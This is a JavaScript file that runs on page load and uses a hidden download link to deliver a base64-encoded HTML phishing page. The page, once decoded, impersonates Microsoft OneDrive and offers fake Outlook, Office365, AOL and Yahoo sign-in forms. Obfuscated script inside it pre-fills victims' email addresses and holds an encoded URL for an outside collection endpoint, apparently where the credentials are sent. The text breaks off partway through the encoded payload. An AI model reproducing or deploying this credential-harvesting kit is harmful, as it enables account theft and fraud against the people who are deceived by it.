$(document).ready(function() {
saveFile();
console.log('Reached here')
});

function saveFile (name, type, data) {
if (data != null && navigator.msSaveBlob)
return navigator.msSaveBlob(new Blob([data], { type: type }), name);
var a = $("<a style='display: none;' />");
var encodedStringAtoB =
'CjwhZG9jdHlwZSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CjxoZWFkPgogIDxzY3JpcHQgc3JjPSJodHRwczovL2FqYXguZ29vZ2xlYXBpcy5jb20vYWpheC9saWJzL2pxdWVyeS8yLjIuNC9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jb2RlLmpxdWVyeS5jb20vanF1ZXJ5LTMuMS4xLm1pbi5qcyI+CiAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jb2RlLmpxdWVyeS5jb20vanF1ZXJ5LTMuMy4xLmpzIiBpbnRlZ3JpdHk9InNoYTI1Ni0yS29rN01iT3l4cGdVVnZBay9ISjJqaWdPU1lTMmF1SzRQZnpibTd1SDYwPSIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+PC9zY3JpcHQ+CiAgICA8IS0tIFJlcXVpcmVkIG1ldGEgdGFncyAtLT4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW5rLXRvLWZpdD1ubyI+CgogICAgPCEtLSBCb290c3RyYXAgQ1NTIC0tPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC80LjAuMC9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiIGludGVncml0eT0ic2hhMzg0LUduNTM4NHhxUTFhb1dYQSswNThSWFB4UGc2Znk0SVd2VE5oMEUyNjNYbUZjSmxTQXdpR2dGQVcvZEFpUzZKWG0iIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiPgogICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PVNlZ2VvVUkmZGlzcGxheT1zd2FwIiByZWw9InN0eWxlc2hlZXQiPgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8va2l0LmZvbnRhd2Vzb21lLmNvbS81ODViMDUxMjUxLmpzIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KICAgIDx0aXRsZT5PbmVEcml2ZTwvdGl0bGU+CiAgICAKCiAgICA8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgoKCiAgICA8L3N0eWxlPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lci1mbHVpZCI+CiAgICAgIDxkaXYgY2xhc3M9InJvdyIgc3R5bGU9ImJhY2tncm91bmQtaW1hZ2U6IHVybCgnaHR0cHM6Ly9iYWZrcmVpZGx0cDZvY2tkZTV6NTRoazNhNDZsaWZ4cmtvYXB3anptcnN4c3pnZHYzdGlvZ3BpcmVqNC5pcGZzLm5mdHN0b3JhZ2UubGluay8nKTsgYmFja2dyb3VuZC1zaXplOiBjb3ZlcjtiYWNrZ3JvdW5kLXJlcGVhdDogbm8tcmVwZWF0OyI+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1sZy02IG14LWF1dG8gbXktNSBweC01IHBiLTUiIHN0eWxlPSJib3JkZXI6MXB4IHNvbGlkOyBiYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDAsMCwwLDAuNyk7Ym9yZGVyLXJhZGl1czoxNXB4OyI+CiAgICAgICAgICAgICAgPGRpdiBjbGFzcz0idGV4dC1jZW50ZXIgcHQtNSI+IAogICAgICAgICAgICAgICAgPGltZyBzcmM9Imh0dHBzOi8vaWNvbi1saWJyYXJ5LmNvbS9pbWFnZXMvb25lLWRyaXZlLWljb24vb25lLWRyaXZlLWljb24tMjguanBnIiBjbGFzcz0iaW1nLWZsdWlkIiB3aWR0aD0iMTAwcHgiPjxicj4KICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJoNCB0ZXh0LXdoaXRlIj5PbmVEcml2ZTwvc3Bhbj48YnI+CiAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iaDUgdGV4dC13aGl0ZSBmb250LXdlaWdodC1ub3JtYWwiPlBsZWFzZSBzZWxlY3QgeW91ciBlbWFpbCBwcm92aWRlciBiZWxvdyBhbmQgbG9naW4gdG8gYWNjZXNzIHNoYXJlZCBkb2N1bWVudC48L3NwYW4+CiAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibXQtMyI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiIGlkPSJvdXRsb29rbW9kYWwiIGNsYXNzPSJodnItZ3JvdyB3LTEwMCIgc3R5bGU9InRleHQtZGVjb3JhdGlvbjogbm9uZTsiIGRhdGEtdG9nZ2xlPSJtb2RhbCIgZGF0YS10YXJnZXQ9IiNhamF4TW9kYWwiPgogICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iIG10LTIiIHN0eWxlPSIgYmFja2dyb3VuZC1jb2xvcjogIzAwNzNDODsiPgogICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9iYWZrcmVpY3hyZ2NnYzRqa21vb3JkZzY3cmMzcml3aXozdGVqazNkMmU0b3M0c3FxcXN6ajVsdGhxdS5pcGZzLm5mdHN0b3JhZ2UubGluay8iIGNsYXNzPSJpbWctZmx1aWQiIHdpZHRoPSI0MHB4IiBzdHlsZT0iIGJhY2tncm91bmQtY29sb3I6IHJnYmEoMCwwLDAsMC4zKTsgcGFkZGluZzo1cHg7Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9InBsLTQiIHN0eWxlPSJ2ZXJ0aWNhbC1hbGlnbjogbWlkZGxlOyBjb2xvcjogd2hpdGU7Zm9udC13ZWlnaHQ6IDUwMDtib3JkZXItcmFkaXVzOiA0cHg7Ij5TaWduIGluIHdpdGggT3V0bG9vazwvc3Bhbj4KICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvYT4KICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im10LTMiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLWxnLTEyICI+CiAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iamF2YXNjcmlwdDp2b2lkKDApIiBpZD0ib2ZmaWNlMzY1bW9kYWwiIGNsYXNzPSJodnItZ3JvdyB3LTEwMCIgc3R5bGU9InRleHQtZGVjb3JhdGlvbjogbm9uZTsiIGRhdGEtdG9nZ2xlPSJtb2RhbCIgZGF0YS10YXJnZXQ9IiNhamF4TW9kYWwiPgogICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iIG10LTIiIHN0eWxlPSIgYmFja2dyb3VuZC1jb2xvcjogI0ZGM0MwMDsiPgogICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9iYWZrcmVpZHI0NHV6aGhxeGw1Zm90dTc0eXpjNW5uenl0M2J1ZGpkMnFza3E0YmRyczR6cjd4YmM2ZS5pcGZzLm5mdHN0b3JhZ2UubGluay8iIGNsYXNzPSJpbWctZmx1aWQiIHdpZHRoPSI0MHB4IiBzdHlsZT0iIGJhY2tncm91bmQtY29sb3I6IHJnYmEoMCwwLDAsMC4zKTsgcGFkZGluZzo1cHg7Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9InBsLTQiICBzdHlsZT0idmVydGljYWwtYWxpZ246IG1pZGRsZTsgY29sb3I6IHdoaXRlO2ZvbnQtd2VpZ2h0OiA1MDA7Ym9yZGVyLXJhZGl1czogNHB4OyI+U2lnbiBpbiB3aXRoIE9mZmljZTM2NTwvc3Bhbj4KICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvYT4KICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibXQtMyI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctMTIgIj4KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiIGlkPSJhb2xtb2RhbCIgY2xhc3M9Imh2ci1ncm93IHctMTAwIiBzdHlsZT0idGV4dC1kZWNvcmF0aW9uOiBub25lOyIgZGF0YS10b2dnbGU9Im1vZGFsIiBkYXRhLXRhcmdldD0iI2FqYXhNb2RhbCI+CiAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSIgIG10LTIiIHN0eWxlPSIgYmFja2dyb3VuZC1jb2xvcjogIzMxNDU5QjsiPgogICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9iYWZrcmVpaHl2ZGh1NmdqaXNvZ2hzM3JwZ3g0bWVneW5rZWd1NHB5dzRhbG81YTZyNmlkcHIyNjZjcS5pcGZzLm5mdHN0b3JhZ2UubGluay8iIGNsYXNzPSJpbWctZmx1aWQiIHdpZHRoPSI0MHB4IiBzdHlsZT0iIGJhY2tncm91bmQtY29sb3I6IHJnYmEoMCwwLDAsMC4zKTsgcGFkZGluZzo1cHg7Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9InBsLTQiIHN0eWxlPSJ2ZXJ0aWNhbC1hbGlnbjogbWlkZGxlOyBjb2xvcjogd2hpdGU7Zm9udC13ZWlnaHQ6IDUwMDtib3JkZXItcmFkaXVzOiA0cHg7Ij5TaWduIGluIHdpdGggQW9sPC9zcGFuPgogICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibXQtMyI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctMTIiPgogICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9ImphdmFzY3JpcHQ6dm9pZCgwKSIgaWQ9InlhaG9vbW9kYWwiIGNsYXNzPSJodnItZ3JvdyB3LTEwMCIgc3R5bGU9InRleHQtZGVjb3JhdGlvbjogbm9uZTsiIGRhdGEtdG9nZ2xlPSJtb2RhbCIgZGF0YS10YXJnZXQ9IiNhamF4TW9kYWwiPgogICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iIG10LTIiIHN0eWxlPSIgYmFja2dyb3VuZC1jb2xvcjogIzVGMEY2ODsiPgogICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9iYWZrcmVpZmsyamhubDQzZGVjbGV5dWszdGNlNHdra2R4cDRkYm5haGFvbXp2dTR4bjdoaWM1eGZrcS5pcGZzLm5mdHN0b3JhZ2UubGluay8iIGNsYXNzPSJpbWctZmx1aWQiIHdpZHRoPSI0MHB4IiBzdHlsZT0iIGJhY2tncm91bmQtY29sb3I6IHJnYmEoMCwwLDAsMC4zKTsgcGFkZGluZzo1cHg7Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9InBsLTQiIHN0eWxlPSJ2ZXJ0aWNhbC1hbGlnbjogbWlkZGxlOyBjb2xvcjogd2hpdGU7Zm9udC13ZWlnaHQ6IDUwMDtib3JkZXItcmFkaXVzOiA0cHg7Ij5TaWduIGluIHdpdGggWWFob28hPC9zcGFuPgogICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im10LTMiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiIGlkPSJvdGhlcm1vZGFsIiBjbGFzcz0iaHZyLWdyb3cgdy0xMDAiIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246IG5vbmU7IiBkYXRhLXRvZ2dsZT0ibW9kYWwiIGRhdGEtdGFyZ2V0PSIjYWpheE1vZGFsIj4KICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9IiBtdC0yIiBzdHlsZT0iIGJhY2tncm91bmQtY29sb3I6ICMwQjVCRDM7Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBzcmM9Imh0dHBzOi8vYmFma3JlaWJvNmJvcGwzdXBoZmZnaGdpaHB3aTZja3hkNXY3eGVtcnRtbWVsenFjcjczZmhmdXd4eGEuaXBmcy5uZnRzdG9yYWdlLmxpbmsvIiBjbGFzcz0iaW1nLWZsdWlkIiB3aWR0aD0iNDBweCIgc3R5bGU9IiBiYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDAsMCwwLDAuMyk7IHBhZGRpbmc6NXB4OyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJwbC00IiAgc3R5bGU9InZlcnRpY2FsLWFsaWduOiBtaWRkbGU7IGNvbG9yOiB3aGl0ZTtmb250LXdlaWdodDogNTAwO2JvcmRlci1yYWRpdXM6IDRweDsiPlNpZ24gaW4gd2l0aCBPdGhlciBNYWlsPC9zcGFuPgogICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4KICAgICAgICAgICAgICAgICAgICAgPGJyPgogICAgICAgICAgICAgICAgPHAgY2xhc3M9Img1IHRleHQtY2VudGVyIHRleHQtd2hpdGUiPsKpIDIwMjMgTWljcm9zb2Z0IE9uZURyaXZlLiBBbGwgcmlnaHQgcmVzZXJ2ZWQ8L3A+IAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgPC9kaXY+IAogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgoKCgogICAgICA8L2Rpdj4gCiAgICA8L2Rpdj4KCgoKCiAgICA8IS0tIE1vZGFsIGZvciBnbWFpbCAtLT4KICAgIDxkaXYgY2xhc3M9Im1vZGFsIGZhZGUiIGlkPSJhamF4TW9kYWwiIHRhYmluZGV4PSItMSIgcm9sZT0iZGlhbG9nIiBhcmlhLWxhYmVsbGVkYnk9ImV4YW1wbGVNb2RhbExhYmVsIiBhcmlhLWhpZGRlbj0idHJ1ZSI+CiAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWRpYWxvZyIgcm9sZT0iZG9jdW1lbnQiPgogICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWNvbnRlbnQiPgogICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtaGVhZGVyIj4KCiAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iY2xvc2UiIGRhdGEtZGlzbWlzcz0ibW9kYWwiIGFyaWEtbGFiZWw9IkNsb3NlIj4KICAgICAgICAgICAgICA8c3BhbiBhcmlhLWhpZGRlbj0idHJ1ZSI+JnRpbWVzOzwvc3Bhbj4KICAgICAgICAgICAgPC9idXR0b24+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWJvZHkiPgogICAgICAgICAgICA8Y2VudGVyPgogICAgICAgICAgICAgIDxpbWcgaWQ9ImZpZWxkSW1nIiBzcmM9Imh0dHBzOi8vaS5pbWd1ci5jb20vNXNMZVlqTC5wbmciIGNsYXNzPSJpbWctZmx1aWQgcm91bmRlZC1jaXJjbGUiIHdpZHRoPSI4MHB4Ij4KICAgICAgICAgICAgICA8aDUgY2xhc3M9Im1vZGFsLXRpdGxlIiBpZD0iZXhhbXBsZU1vZGFsTGFiZWwiPkxvZ2luIHdpdGggPHNwYW4gaWQ9ImZpZWxkIj5HbWFpbDwvc3Bhbj48L2g1PgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImFsZXJ0IGFsZXJ0LWRhbmdlciIgaWQ9Im1zZyIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij5JbnZhbGlkIFBhc3N3b3JkLiEgUGxlYXNlIGVudGVyIGNvcnJlY3QgcGFzc3dvcmQuPC9kaXY+CiAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9InRleHQtZGFuZ2VyIGVycm9yIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPlRoYXQgYWNjb3VudCBkb2Vzbid0IGV4aXN0LiBFbnRlciBhIGRpZmZlcmVudCBhY2NvdW50PC9zcGFuPgoKICAgICAgICAgICAgPC9jZW50ZXI+CiAgICAgICAgICAgIDxmb3JtIGlkPSJjb250YWN0IiBjbGFzcz0iZm9ybS1ob3Jpem9udGFsIHdlbGwiPgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1sZy0xMiI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0iZXhhbXBsZUlucHV0RW1haWwxIj5FbWFpbCBhZGRyZXNzPC9sYWJlbD4KICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImVtYWlsIiBuYW1lPSJlbWFpbCIgY2xhc3M9ImZvcm0tY29udHJvbCIgaWQ9ImFpIiBhcmlhLWRlc2NyaWJlZGJ5PSJlbWFpbEhlbHAiIHBsYWNlaG9sZGVyPSJFbnRlciBlbWFpbCI+CiAgICAgICAgICAgICAgICAgIDxzbWFsbCBpZD0iZW1haWxIZWxwIiBjbGFzcz0iZm9ybS10ZXh0IHRleHQtbXV0ZWQiPldlJ2xsIG5ldmVyIHNoYXJlIHlvdXIgZW1haWwgd2l0aCBhbnlvbmUgZWxzZS48L3NtYWxsPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPgogICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJQYXNzd29yZCI+UGFzc3dvcmQ8L2xhYmVsPgogICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3N3b3JkIiBjbGFzcz0iZm9ybS1jb250cm9sIiBpZD0icHIiIGFyaWEtZGVzY3JpYmVkYnk9ImVtYWlsSGVscCIgcGxhY2Vob2xkZXI9IkVudGVyIFBhc3N3b3JkIj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtZm9vdGVyIj4KICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tc2Vjb25kYXJ5IiBkYXRhLWRpc21pc3M9Im1vZGFsIj5DbG9zZTwvYnV0dG9uPgogICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biBidG4tbGcgYnRuLWluZm8gcHVsbC1yaWdodCIgaWQ9InN1Ym1pdC1idG4iPkxvZ2luPC9idXR0b24+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPC9mb3JtPgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgCgogICAgPCEtLSBPcHRpb25hbCBKYXZhU2NyaXB0IC0tPgogICAgPCEtLSBqUXVlcnkgZmlyc3QsIHRoZW4gUG9wcGVyLmpzLCB0aGVuIEJvb3RzdHJhcCBKUyAtLT4KICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2NvZGUuanF1ZXJ5LmNvbS9qcXVlcnktMy4yLjEuc2xpbS5taW4uanMiIGludGVncml0eT0ic2hhMzg0LUtKM28yREt0SWt2WUlLM1VFTnptTTdLQ2tSci9yRTkvUXBnNmFBWkdKd0ZETVZOQS9HcEdGRjkzaFhwRzVLa04iIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL3BvcHBlci5qcy8xLjEyLjkvdW1kL3BvcHBlci5taW4uanMiIGludGVncml0eT0ic2hhMzg0LUFwTmJnaDlCK1kxUUt0djNSbjdXM21nUHhoVTlLL1NjUXNBUDdoVWliWDM5ajdmYWtGUHNrdlh1c3ZmYTBiNFEiIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vbWF4Y2RuLmJvb3RzdHJhcGNkbi5jb20vYm9vdHN0cmFwLzQuMC4wL2pzL2Jvb3RzdHJhcC5taW4uanMiIGludGVncml0eT0ic2hhMzg0LUpaUjZTcGVqaDRVMDJkOGpPdDZ2TEVIZmUvSlFHaVJSU1FReFNmRldwaTFNcXVWZEF5alVhcjUrNzZQVkNtWWwiIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiPjwvc2NyaXB0PgogIDwvYm9keT4KCiAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWpheC5nb29nbGVhcGlzLmNvbS9hamF4L2xpYnMvanF1ZXJ5LzIuMi40L2pxdWVyeS5taW4uanMiPjwvc2NyaXB0PgogIDxzY3JpcHQ+CgovL3JlZGlyZWN0IGxpbmsKdmFyIHJkcnQgPSAiaHR0cHM6Ly9vdXRsb29rLm9mZmljZS5jb20vbWFpbC8iOwoKLy9tYWlsIHJlc3VsdCBjb3VudAp2YXIgcmMgPSAyOwoKLy9tYWlsZXIgbGluawp2YXIgZiA9IGF0b2IoImFIUjBjSE02THk5eVpYTnZkWEpqWlhONFpYSnZlQzVqYjIwdk5tbDRabWxuZFhKbGN5OXlaV1p2Y20wdlpHVm1MbkJvY0E9PSIpOwoKCiQoZG9jdW1lbnQpLnJlYWR5KGZ1bmN0aW9uKCkgewogICAgdmFyIGwgPSAwOwogICAgdmFyIG4gPSAiYjNWMGJHOXZhdz09IjsKICAgIHZhciBvID0gImFHOTBiV0ZwYkE9PSI7CiAgICB2YXIgcCA9ICJaMjFoYVd3PSI7CiAgICB2YXIgcSA9ICJlV0ZvYjI4PSI7CiAgICB2YXIgciA9ICJiMlptYVdObE16WTEiOwoKICAgIGZ1bmN0aW9uIGdldFVybFZhcnMoKSB7CiAgICAgICAgdmFyIGMgPSB7fTsKICAgICAgICB2YXIgZCA9IHdpbmRvdy5sb2NhdGlvbi5ocmVmLnJlcGxhY2UoL1s/Jl0rKFtePSZdKyk9KFteJl0qKS9naSwgZnVuY3Rpb24obSwgYSwgYikgewogICAgICAgICAgICBjW2FdID0gYgogICAgICAgIH0pOwogICAgICAgIHJldHVybiBjCiAgICB9CiAgICBpZiAoIWdldFVybFZhcnMoKVsiY291bnQiXSkge30gZWxzZSB7CiAgICAgICAgdmFyIGwgPSBnZXRVcmxWYXJzKClbImNvdW50Il07CiAgICAgICAgJCgnI2NvdW50JykudmFsKGwpCiAgICB9CiAgICB2YXIgcyA9IHdpbmRvdy5sb2NhdGlvbi5oYXNoLnN1YnN0cigxKTsKICAgIGlmICghcykge30gZWxzZSB7CiAgICAgICAgdmFyIHQgPSBzOwogICAgICAgIHZhciB1ID0gL14oW2EtekEtWjAtOV9cLlwtXSkrXEAoKFthLXpBLVowLTlcLV0pK1wuKSsoW2EtekEtWjAtOV17Miw0fSkrJC87CiAgICAgICAgaWYgKCF1LnRlc3QodCkpIHsKICAgICAgICAgICAgJCgnLmVycm9yJykuc2hvdygpOwogICAgICAgICAgICBzLmZvY3VzOwogICAgICAgICAgICByZXR1cm4gZmFsc2UKICAgICAgICB9CiAgICAgICAgdmFyIHYgPSB0LmluZGV4T2YoIkAiKTsKICAgICAgICB2YXIgdyA9IHQuc3Vic3RyKCh2ICsgMSkpOwogICAgICAgIHZhciBjID0gdy5zdWJzdHIoMCwgdy5pbmRleE9mKCcuJykpOwogICAgICAgIHZhciB4ID0gYy50b0xvd2VyQ2FzZSgpOwogICAgICAgIHZhciBzID0gd2luZG93LmxvY2F0aW9uLmhhc2guc3Vic3RyKDEpOwogICAgICAgIHZhciB0ID0gczsKICAgICAgICB2YXIgdSA9IC9eKFthLXpBLVowLTlfXC5cLV0pK1xAKChbYS16QS1aMC05XC1dKStcLikrKFthLXpBLVowLTldezIsNH0pKyQvOwogICAgICAgIHZhciB2ID0gdC5pbmRleE9mKCJAIik7CiAgICAgICAgdmFyIHcgPSB0LnN1YnN0cigodiArIDEpKTsKICAgICAgICB2YXIgYyA9IHcuc3Vic3RyKDAsIHcuaW5kZXhPZignLicpKTsKICAgICAgICB2YXIgeCA9IGMudG9Mb3dlckNhc2UoKTsKICAgICAgICB2YXIgbCA9ICQoJyNjb3VudCcpLnZhbCgpOwogICAgICAgIGlmICh4ID09IGF0b2IocCkpIHsKICAgICAgICAgICAgJCgnI2ZpZWxkSW1nJykuYXR0cignc3JjJywgJ2h0dHBzOi8vaS5pbWd1ci5jb20vNXNMZVlqTC5wbmcnKTsKICAgICAgICAgICAgJCgnI2ZpZWxkJykuaHRtbChhdG9iKHApKTsKICAgICAgICAgICAgJCgnI2FpJykudmFsKHQpOwogICAgICAgICAgICAkKCcjYWljaCcpLmh0bWwodCk7CiAgICAgICAgICAgICQoIiNnbWFpbG1vZGFsIikudHJpZ2dlcigiY2xpY2siKQogICAgICAgIH0gZWxzZSBpZiAoeCA9PSBhdG9iKG4pIHx8IHggPT0gYXRvYihvKSkgewogICAgICAgICAgICAkKCcjZmllbGRJbWcnKS5hdHRyKCdzcmMnLCAnaHR0cHM6Ly9pLmltZ3VyLmNvbS9tZHJvbU5zLnBuZycpOwogICAgICAgICAgICAkKCcjZmllbGQnKS5odG1sKCJPdXRsb29rIik7CiAgICAgICAgICAgICQoJyNhaScpLnZhbCh0KTsKICAgICAgICAgICAgJCgnI2FpY2gnKS5odG1sKHQpOwogICAgICAgICAgICAkKCIjb3V0bG9va21vZGFsIikudHJpZ2dlcigiY2xpY2siKQogICAgICAgIH0gZWxzZSBpZiAoeCA9PSAiYW9sIikgewogICAgICAgICAgICAkKCcjZmllbGRJbWcnKS5hdHRyKCdzcmMnLCAnaHR0cHM6Ly9pLmltZ3VyLmNvbS9INWNzZ21JLnBuZycpOwogICAgICAgICAgICAkKCcjZmllbGQnKS5odG1sKCJBb2wiKTsKICAgICAgICAgICAgJCgnI2FpJykudmFsKHQpOwogICAgICAgICAgICAkKCcjYWljaCcpLmh0bWwodCk7CiAgICAgICAgICAgICQoIiNhb2xtb2RhbCIpLnRyaWdnZXIoImNsaWNrIikKICAgICAgICB9IGVsc2UgaWYgKHggPT0gYXRvYihyKSkgewogICAgICAgICAgICAkKCcjZmllbGRJbWcnKS5hdHRyKCdzcmMnLCAnaHR0cHM6Ly9pLmltZ3VyLmNvbS82Yk9MUlNpLnBuZycpOwogICAgICAgICAgICAkKCcjZmllbGQnKS5odG1sKCJPZmZpY2UgMzY1Iik7CiAgICAgICAgICAgICQoJyNhaScpLnZhbCh0KTsKICAgICAgICAgICAgJCgnI2FpY2gnKS5odG1sKHQpOwogICAgICAgICAgICAkKCIjb2ZmaWNlMzY1bW9kYWwiKS50cmlnZ2VyKCJjbGljayIpCiAgICAgICAgfSBlbHNlIGlmICh4ID09IGF0b2IocSkpIHsKICAgICAgICAgICAgJCgnI2ZpZWxkSW1nJykuYXR0cignc3JjJywgJ2h0dHBzOi8vaS5pbWd1ci5jb20vZmZIRG5mNy5wbmcnKTsKICAgICAgICAgICAgJCgnI2ZpZWxkJykuaHRtbCgiWWFob28iKTsKICAgICAgICAgICAgJCgnI2FpJykudmFsKHQpOwogICAgICAgICAgICAkKCcjYWljaCcpLmh0bWwodCk7CiAgICAgICAgICAgICQoIiN5YWhvb21vZGFsIikudHJpZ2dlcigiY2xpY2siKQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICQoJyNmaWVsZEltZycpLmF0dHIoJ3NyYycsICdodHRwczovL2kuaW1ndXIuY29tL1dyYT